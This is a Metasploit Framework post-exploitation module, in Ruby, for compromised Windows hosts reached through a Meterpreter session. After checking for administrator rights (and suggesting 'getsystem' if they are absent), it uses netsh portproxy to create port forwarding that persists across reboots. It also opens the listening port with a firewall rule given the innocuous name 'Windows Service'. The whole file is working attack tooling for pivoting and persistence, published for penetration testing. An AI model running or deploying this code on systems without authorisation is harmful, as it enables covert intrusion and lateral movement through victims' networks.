##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Post::Common

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage PortProxy Interface',
			'Description'   => %q{
					This module uses the PortProxy interface from netsh to set up port forwarding
				persistently (even after reboot). PortProxy supports TCP IPv4 and IPv6 connections.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptAddress.new('LADDRESS', [ true, 'IPv4/IPv6 address to which to listen.']),
				OptAddress.new('CADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),
				OptInt.new(    'CPORT',    [ true, 'Port number to which to connect.']),
				OptInt.new(    'LPORT',    [ true, 'Port number to which to listen.']),
				OptEnum.new(   'TYPE',     [ true, 'Type of forwarding', 'v4tov4', ['v4tov4','v6tov6','v6tov4','v4tov6']])
			], self.class)
		end

	def run
		if not is_admin?
			print_error("You don't have enough privileges. Try getsystem.")
			return
		end

		type = datastore['TYPE']
		lport = datastore['LPORT']
		cport = datastore['CPORT']
		laddress = datastore['LADDRESS']
		caddress = datastore['CADDRESS']

		return if not enable_portproxy(lport,cport,laddress,caddress,type)
		fw_enable_ports(lport)

	end

	def enable_portproxy(lport,cport,laddress,caddress,type)
		# Due to a bug in Windows XP you need to install ipv6
		# http://support.microsoft.com/kb/555744/en-us
		if sysinfo["OS"] =~ /XP/
			return false if not enable_ipv6()
		end

		print_status("Setting PortProxy ...")
		output = cmd_exec("netsh","interface portproxy add #{type} listenport=#{lport} listenaddress=#{laddress} connectport=#{cport} connectaddress=#{caddress}")
		if output.size > 2
			print_error("Setup error. Verify parameters and syntax.")
			return false
		else
			print_good("PortProxy added.")
		end

		output = cmd_exec("netsh","interface portproxy show all")
		print_status("Local IP\tLocal Port\tRemote IP\tRemote Port")
		output.each_line do |l|
			print_status("#{l.chomp}") if l.strip =~ /^[0-9]|\*/
		end
		return true
	end

	def enable_ipv6()
		print_status("Checking IPv6. This could take a while ...")
		cmd_exec("netsh","interface ipv6 install",120)
		output = cmd_exec("netsh","interface ipv6 show global")
		if output =~ /-----/
			print_good("IPV6 installed.")
			return true
		else
			print_error("IPv6 was not successfully installed. Run it again.")
			return false
		end
	end

	def fw_enable_ports(port)
		print_status ("Setting port #{port} in Windows Firewall ...")
		begin
			if sysinfo["OS"] =~ /Windows 7|Vista|2008|2012/
				cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{port}\"")
			else
				cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{port}\"")
			end
			output = cmd_exec("netsh","firewall show state")

			if  output =~ /^#{port} /
				print_good("Port opened in Windows Firewall.")
			else
				print_error("There was an error enabling the port.")
			end
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end
end
